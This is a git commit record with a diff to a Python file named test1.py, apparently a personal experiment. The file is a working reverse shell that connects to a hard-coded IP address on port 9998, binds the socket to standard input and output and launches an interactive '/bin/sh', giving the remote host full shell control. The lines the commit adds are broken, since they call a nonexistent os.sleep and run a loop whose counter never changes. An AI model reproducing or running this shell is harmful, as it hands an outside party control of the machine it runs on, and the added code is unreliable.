78b1935ff94a2d81164ad14c06c54e7199902d86
dddsjz <junzhe.sun13@gmail.com>
2020-11-20 09:38:31 +0800

    Update test1.py

--- test1.py
+++ test1.py
@@ -1,12 +1,17 @@
 import socket,subprocess,os
 
 def main():
+  print('Try')
+  count = 0
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("167.179.96.180",9998))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(["/bin/sh","-i"])
+  print(p)
+  while count < 1000:
+    os.sleep(1)
   
 if __name__ == '__main__':
   main()
